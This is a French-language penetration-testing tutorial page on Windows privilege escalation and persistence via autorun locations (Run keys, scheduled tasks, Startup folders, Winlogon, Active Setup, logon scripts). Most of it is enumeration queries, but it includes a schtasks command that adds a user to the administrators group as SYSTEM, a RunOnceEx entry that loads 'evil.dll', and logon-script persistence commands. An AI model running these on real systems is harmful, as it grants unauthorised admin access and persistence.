# Élévation de privilèges avec Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** peut être utilisé pour exécuter des programmes **au démarrage**. Pour voir quels binaires sont programmés pour s’exécuter au démarrage, utilisez :
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tâches planifiées

Les **tâches** peuvent être planifiées pour s’exécuter à une **fréquence spécifique**. Utilisez les commandes suivantes pour voir quels binaires sont planifiés pour être exécutés :
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Dossiers

Tous les binaires situés dans les **dossiers de démarrage seront exécutés au démarrage**. Les dossiers de démarrage courants sont ceux listés ci-dessous, mais le dossier de démarrage est indiqué dans le registre. [Lisez ceci pour savoir où.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **À titre informatif** : Les vulnérabilités de *path traversal* lors de l'extraction d'archives (comme celle exploitée dans WinRAR avant la version 7.13 – CVE-2025-8088) peuvent être exploitées pour **déposer des payloads directement dans ces dossiers Startup pendant la décompression**, ce qui entraîne une exécution de code à la prochaine connexion de l'utilisateur. Pour une analyse approfondie de cette technique, voir :


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registre

> [!TIP]
> [Note à partir d'ici](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f) : L'entrée de registre **Wow6432Node** indique que vous utilisez une version 64 bits de Windows. Le système d'exploitation utilise cette clé pour afficher une vue séparée de HKEY_LOCAL_MACHINE\SOFTWARE destinée aux applications 32 bits exécutées sur les versions 64 bits de Windows.

### Runs

**AutoRun couramment connus** :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Les clés de registre appelées **Run** et **RunOnce** sont conçues pour exécuter automatiquement des programmes chaque fois qu'un utilisateur se connecte au système. La ligne de commande attribuée comme valeur de données d'une clé est limitée à 260 caractères ou moins.<sup>[[2]](#references)</sup>

**Service runs** (peuvent contrôler le démarrage automatique des services lors du boot) :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx :**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Sous Windows Vista et les versions ultérieures, les clés de registre **Run** et **RunOnce** ne sont pas générées automatiquement. Les entrées de ces clés peuvent soit démarrer directement des programmes, soit les spécifier comme dépendances. Par exemple, pour charger un fichier DLL lors de la connexion, il est possible d'utiliser la clé de registre **RunOnceEx** avec une clé « Depend ». Cela est illustré par l'ajout d'une entrée de registre destinée à exécuter « C:\temp\evil.dll » lors du démarrage du système :<sup>[[2]](#references)</sup>
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1** : Si vous pouvez écrire dans l’une des clés de registre mentionnées dans **HKLM**, vous pouvez escalader vos privilèges lorsqu’un autre utilisateur se connecte.

> [!TIP]
> **Exploit 2** : Si vous pouvez écraser l’un des binaires indiqués dans l’une des clés de registre de **HKLM**, vous pouvez modifier ce binaire avec une backdoor lorsqu’un autre utilisateur se connecte et escalader vos privilèges.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Chemin de démarrage

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Les raccourcis placés dans le dossier **Startup** déclencheront automatiquement le lancement de services ou d'applications lors de la connexion de l'utilisateur ou du redémarrage du système. L'emplacement du dossier **Startup** est défini dans le registre pour les étendues **Local Machine** et **Current User**. Cela signifie que tout raccourci ajouté à ces emplacements **Startup** spécifiés garantira le démarrage du service ou du programme associé après le processus de connexion ou de redémarrage, ce qui constitue une méthode simple pour planifier l'exécution automatique de programmes.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Si vous pouvez écraser un dossier \[User] Shell Folder sous **HKLM**, vous pourrez le rediriger vers un dossier que vous contrôlez et y placer une backdoor qui sera exécutée chaque fois qu'un utilisateur se connecte au système, permettant ainsi une privilege escalation.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Cette valeur de registre par utilisateur peut pointer vers un script ou une commande exécuté(e) lorsque cet utilisateur ouvre une session. Il s'agit principalement d'un primitive de **persistence**, car elle ne s'exécute que dans le contexte de l'utilisateur concerné, mais elle reste utile à vérifier pendant la post-exploitation et les revues d'autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Si vous pouvez écrire cette valeur pour l'utilisateur actuel, vous pouvez déclencher à nouveau l'exécution lors de la prochaine ouverture de session interactive sans avoir besoin de droits administrateur. Si vous pouvez l'écrire dans la ruche d'un autre utilisateur, vous pouvez obtenir une exécution de code lorsque cet utilisateur ouvre une session.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes :

- Préférez les chemins complets vers les fichiers `.bat`, `.cmd`, `.ps1` ou autres fichiers launcher déjà lisibles par l’utilisateur cible.
- Cela persiste après une fermeture de session ou un redémarrage jusqu’à la suppression de la valeur.
- Contrairement à `HKLM\...\Run`, cela **n’accorde pas de privilèges élevés** par lui-même ; il s’agit d’une persistence au niveau utilisateur.

### Clés Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

En général, la clé **Userinit** est définie sur **userinit.exe**. Cependant, si cette clé est modifiée, l’exécutable spécifié sera également lancé par **Winlogon** lors de la connexion de l’utilisateur. De même, la clé **Shell** est destinée à pointer vers **explorer.exe**, qui est le shell par défaut de Windows.<sup>[[1]](#references)</sup>
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Si vous pouvez écraser la valeur du registre ou le binaire, vous pourrez élever vos privilèges.

### Paramètres de stratégie

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Vérifiez la clé `Run`.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Modification de l’invite de commandes du mode sans échec

Dans le Registre Windows, sous `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, une valeur **`AlternateShell`** est définie par défaut sur `cmd.exe`. Cela signifie que lorsque vous choisissez « Mode sans échec avec invite de commandes » au démarrage (en appuyant sur F8), `cmd.exe` est utilisé. Cependant, il est possible de configurer votre ordinateur pour qu’il démarre automatiquement dans ce mode sans avoir besoin d’appuyer sur F8 et de le sélectionner manuellement.

Étapes pour créer une option de démarrage permettant de lancer automatiquement le « Mode sans échec avec invite de commandes » :<sup>[[5]](#references)</sup>

1. Modifiez les attributs du fichier `boot.ini` pour supprimer les indicateurs lecture seule, système et masqué : `attrib c:\boot.ini -r -s -h`
2. Ouvrez `boot.ini` pour le modifier.
3. Insérez une ligne telle que : `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Enregistrez les modifications apportées à `boot.ini`.
5. Réappliquez les attributs d’origine du fichier : `attrib c:\boot.ini +r +s +h`

- **Exploit 1 :** La modification de la clé de Registre **AlternateShell** permet de configurer un shell de commandes personnalisé, potentiellement à des fins d’accès non autorisé.
- **Exploit 2 (autorisations d’écriture sur PATH) :** Disposer d’autorisations d’écriture sur une partie quelconque de la variable système **PATH**, en particulier avant `C:\Windows\system32`, permet d’exécuter un `cmd.exe` personnalisé, ce qui pourrait constituer une backdoor si le système est démarré en mode sans échec.
- **Exploit 3 (autorisations d’écriture sur PATH et boot.ini) :** Un accès en écriture à `boot.ini` permet de lancer automatiquement le mode sans échec, facilitant un accès non autorisé au prochain redémarrage.

Pour vérifier le paramètre **AlternateShell** actuel, utilisez ces commandes :
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Composant installé

Active Setup est une fonctionnalité de Windows qui **s'exécute avant le chargement complet de l'environnement de bureau**. Elle donne la priorité à l'exécution de certaines commandes, qui doivent se terminer avant que la procédure d'ouverture de session de l'utilisateur ne se poursuive. Ce processus se produit même avant le déclenchement d'autres entrées de démarrage, telles que celles des sections de registre Run ou RunOnce.

Active Setup est géré via les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ces clés contiennent différents sous-clés, chacune correspondant à un composant spécifique. Les valeurs particulièrement intéressantes sont les suivantes :

- **IsInstalled :**
- `0` indique que la commande du composant ne sera pas exécutée.
- `1` signifie que la commande sera exécutée une fois pour chaque utilisateur, ce qui constitue le comportement par défaut si la valeur `IsInstalled` est absente.
- **StubPath :** définit la commande à exécuter par Active Setup. Il peut s'agir de n'importe quelle ligne de commande valide, par exemple le lancement de `notepad`.

**Informations de sécurité :**

- La modification ou l'écriture d'une clé où **`IsInstalled`** est défini sur `"1"` avec un **`StubPath`** spécifique peut entraîner l'exécution non autorisée de commandes, ce qui peut permettre une privilege escalation.
- La modification du fichier binaire référencé dans n'importe quelle valeur **`StubPath`** peut également permettre une privilege escalation, si les permissions sont suffisantes.

Pour inspecter les configurations **`StubPath`** de tous les composants Active Setup, les commandes suivantes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Présentation des Browser Helper Objects (BHOs)

Les Browser Helper Objects (BHOs) sont des modules DLL qui ajoutent des fonctionnalités supplémentaires à Internet Explorer de Microsoft. Ils se chargent dans Internet Explorer et Windows Explorer à chaque démarrage. Cependant, leur exécution peut être bloquée en définissant la clé **NoExplorer** sur 1, ce qui les empêche de se charger avec les instances de Windows Explorer.<sup>[[1]](#references)</sup>

Les BHO sont compatibles avec Windows 10 via Internet Explorer 11, mais ne sont pas pris en charge dans Microsoft Edge, le navigateur par défaut des versions plus récentes de Windows.

Pour examiner les BHO enregistrés sur un système, vous pouvez inspecter les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Chaque BHO est représenté par son **CLSID** dans le registre, qui sert d’identifiant unique. Des informations détaillées sur chaque CLSID sont disponibles sous `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Pour interroger les BHO dans le registre, les commandes suivantes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Extensions Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Notez que le registre contiendra une nouvelle entrée de registre pour chaque dll, représentée par le **CLSID**. Vous pouvez trouver les informations du CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Pilotes de polices

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Commande Open

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Notez que tous les emplacements où vous pouvez trouver des autoruns sont **déjà analysés par**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Cependant, pour obtenir une liste **plus complète des fichiers exécutés automatiquement**, vous pouvez utiliser [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)de systinternals :
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Plus

**Trouvez davantage d’Autoruns similaires aux registres dans** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Mécanismes courants de persistance des malwares](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Boot or Logon Initialization Scripts: Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Catégories de démarrage automatique (Dépannage avec les outils Windows Sysinternals, 2e édition)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Comment puis-je ajouter une option de démarrage qui lance un shell alternatif ?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Bilan de Metasploit 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [PR Metasploit #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
